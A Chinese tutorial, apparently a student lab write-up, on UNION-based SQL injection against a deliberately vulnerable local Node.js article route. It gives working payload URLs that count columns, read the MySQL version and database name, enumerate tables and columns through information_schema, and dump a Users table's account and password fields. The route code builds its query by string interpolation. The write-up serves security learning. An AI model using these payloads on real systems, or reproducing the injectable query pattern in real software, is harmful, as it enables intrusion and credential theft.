## 计算机病毒与入侵关于SQL注入的研究（二）
### 写在前面
上一次我们尝试了越过用户登录权限，这一次我们再来尝试：**通过union拖库**
> union大法吼

### SQL注入前准备
- 生成测试需要的数据库和表
编写models/Article和models/migrate.js，然后运行node models/migrate重置数据库，生成如下图所示的Articles表：
![second1.png](http://git.oschina.net/mrbian/ComputerVirus/raw/master/second/images/second1.png?dir=0&filepath=second%2Fimages%2Fsecond1.png&oid=ad65c704b7552c852a4a508338fdb9cc0a7d1c17&sha=ca6c943f09be7b21a326ac9e4b2720d8cd6094d5=100x100)
- 编写路由代码：
```javascript
router.get("/article",function *(){
    var ctx = this;
    var query = ctx.request.query;
    var articleId = query.id || 1;
    debug("SQL",`select * from Articles where id = ${articleId}`);
    var data = yield db.query(`select * from Articles where id = ${articleId}`,{
        type: db.QueryTypes.SELECT
    });
    data = data.length !== 0 ? data[data.length - 1] : {
        title : "没有这个文章",
        content :"<p>没有这个文章</p>"
    };
    // debug(data);
    yield ctx.render("index.html", data);
})
```
上面是一个路由函数。简单的说就是处理GET参数id，然后使用SQL对id进行查询，得到数据渲染html返回给浏览器端。
对应路由是```http://localhost:3030/article?id=1```
运行起来如下图：
![second2.png](http://git.oschina.net/mrbian/ComputerVirus/raw/master/second/images/second2.png?dir=0&filepath=second%2Fimages%2Fsecond2.png&oid=31bb9fedb84be69ba698f50b9b543e1109ba2054&sha=ca6c943f09be7b21a326ac9e4b2720d8cd6094d5)

- 编写css和gulpfile.js自动化脚本等
引入browsersync和gulp自动脚本，与注入无关，略过

### SQL注入测试
首先测试 ```http://localhost:3030/article？id=3/*ABC*/```
可以发现返回的页面没有变化，说明对输入没有过滤，这里是可以注入的。
现在我们使用自己写的union进行邪恶地拖库（注：造成空格有两种：一种直接加空格Encode之后就是  ，一种使用/\*\*/注释来分隔，下面我们空格方便查看）
- 第一步，测试SQL注入语句，访问```http://localhost:3030/article?id=3 and 1=2```
可以发现页面显示没有文章，因为1=2永远为false，所以返回的是没有文章。
![second3.png](http://git.oschina.net/mrbian/ComputerVirus/raw/master/second/images/second3.png?dir=0&filepath=second%2Fimages%2Fsecond3.png&oid=9f6a8d91c3a61bfda1dccadae8e980a2daaae91f&sha=ca6c943f09be7b21a326ac9e4b2720d8cd6094d5)

- 第二步，union链接得到当前文章所在表的字段个数，从1开始测
```
http://localhost:3030/article?id=3 and 1=1 union select 1
http://localhost:3030/article?id=3 and 1=1 union select 1,2  
http://localhost:3030/article?id=3 and 1=1 union select 1,2,3  
http://localhost:3030/article?id=3 and 1=1 union select 1,2,3,4  
http://localhost:3030/article?id=3 and 1=1 union select 1,2,3,4,5  
```
前四步执行的时候都显示：
![second4.png](http://git.oschina.net/mrbian/ComputerVirus/raw/master/second/images/second4.png?dir=0&filepath=second%2Fimages%2Fsecond4.png&oid=d309dcd588b2739a221d708d02b1467cd4250b1e&sha=ca6c943f09be7b21a326ac9e4b2720d8cd6094d5)
因为union两头连接的表的字段数不一样，所以后台处理会发生错误，总之返回肯定会不正常，有的可能还会显示DEBUG信息= - =
最后第五步成功，我们放到mysql里面执行就是如下结果：
![second5.png](http://git.oschina.net/mrbian/ComputerVirus/raw/master/second/images/second5.png?dir=0&filepath=second%2Fimages%2Fsecond5.png&oid=841a123777bf1e7491dbcf28670f186a22957258&sha=ca6c943f09be7b21a326ac9e4b2720d8cd6094d5)
这个时候我们发现页面会发现展示的还是id=3的文章，返回信息没有变化，为什么呢?
我们看路由处理里面的代码，会发现取得数据是数组的第一个：
![second6.png](http://git.oschina.net/mrbian/ComputerVirus/raw/master/second/images/second6.png?dir=0&filepath=second%2Fimages%2Fsecond6.png&oid=f2643606e71c9dffd36753c57ecc3572008e7d31&sha=ca6c943f09be7b21a326ac9e4b2720d8cd6094d5)
所以碰到这种情况我们只要加一个order by id DESC就可以了：
```
http://localhost:3030/article?id=3 and 1=1 union select 10000,2,3,4,5 order by id DESC  
```
这个时候我们sql的执行结果是：
![second7.png](http://git.oschina.net/mrbian/ComputerVirus/raw/master/second/images/second7.png?dir=0&filepath=second%2Fimages%2Fsecond7.png&oid=d71a2ad62bb3005184a590b1052ad05f5d26770c&sha=ca6c943f09be7b21a326ac9e4b2720d8cd6094d5)
页面的返回结果是：
![second8.png](http://git.oschina.net/mrbian/ComputerVirus/raw/master/second/images/second8.png?dir=0&filepath=second%2Fimages%2Fsecond8.png&oid=4b28e96ca18ac5fe5faddf018269ba88302ffb87&sha=ca6c943f09be7b21a326ac9e4b2720d8cd6094d5)
！！！我们可以看到我们输入的2，3分别在这里被展示在了页面上，开心O(∩_∩)O哈哈~，这说明我们只要将2,3改成我们想要的信息就可以随意查看，好的，下面我们来进行第三步

- 第三步，得到数据库的信息：
将URL改成：
```
http://localhost:3030/article?id=3 and 1=1 union select 10000,version(),database(),4,5 order by id DESC  
```
通过mysql内置的函数看到了数据库的版本，数据表的名称：
![second9.png](http://git.oschina.net/mrbian/ComputerVirus/raw/master/second/images/second9.png?dir=0&filepath=second%2Fimages%2Fsecond9.png&oid=26239ee0a623bd228a1a6a15c759a548bca886bc&sha=ca6c943f09be7b21a326ac9e4b2720d8cd6094d5)
这很棒哦。现在我们要记住virustest这个数据库的名称，在下面有用处

- 第四步，得到这个数据库里面所有的表的名称：
将URL改成：
```
http://localhost:3030/article?id=3 and 1=1 union select 10000,2,TABLE_NAME,4,5 FROM INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA=virustest order by rand() DESC  
```
order by rand()是为了能够查看到所有的表名，我们多执行几次，就可以看到有一个Users表：
![second10.png](http://git.oschina.net/mrbian/ComputerVirus/raw/master/second/images/second10.png?dir=0&filepath=second%2Fimages%2Fsecond10.png&oid=7c04e1e47934c7e01b17781ad2307ac931a1a142&sha=ca6c943f09be7b21a326ac9e4b2720d8cd6094d5)
这个表就有意思了，我们来继续注入，尝试着拿到用户名和密码

- 第五步，拖出数据库内Users表的表段名称
将URL改成：
```
http://localhost:3030/article?id=3 and 1=1 union SELECT 10000,COLUMN_NAME,3,4,5 FROM information_schema.columns where TABLE_SCHEMA='virustest' and TABLE_NAME='Users' order by rand()
```
不断运行，由于order by rand()所以可以陆续看到所有的列名，我们可以看到有两个我们比较感兴趣：
![second11.png](http://git.oschina.net/mrbian/ComputerVirus/raw/master/second/images/second11.png?dir=0&filepath=second%2Fimages%2Fsecond11.png&oid=1a11580e22b0021646f3c07763243f47e49e54d3&sha=ca6c943f09be7b21a326ac9e4b2720d8cd6094d5)
![second12.png](http://git.oschina.net/mrbian/ComputerVirus/raw/master/second/images/second12.png?dir=0&filepath=second%2Fimages%2Fsecond12.png&oid=b733f21a45c93c0685bb719fb0bde8a8bdc654dd&sha=ca6c943f09be7b21a326ac9e4b2720d8cd6094d5)
记下account和password字段名称，我们开始拖出数据

- 第六步，拖出数据库内的数据
将URL改成
```
http://localhost:3030/article?id=3 and 1=1 union select 1,account,password,4,5 from Users order by rand() DESC
```
结果：
![second13.png](http://git.oschina.net/mrbian/ComputerVirus/raw/master/second/images/second13.png?dir=0&filepath=second%2Fimages%2Fsecond13.png&oid=8f989ffb55ff784f929f253faf7bd03c8c1da711&sha=ca6c943f09be7b21a326ac9e4b2720d8cd6094d5)
不断F5刷新，就可以看到所有的account和password

### 简单的注入分析
以上所有的注入过程都是对普通SQL语言的利用。
开发一个项目的时经常用到类似于id=?或者title=?这样的GET参数查询，不只是页面展示，在Restful API的时代，无论是前端web，还是手机app，与后端通信也很有可能会有很多这样的漏洞。很普遍的注入模式，造成的后果往往是灾难性的。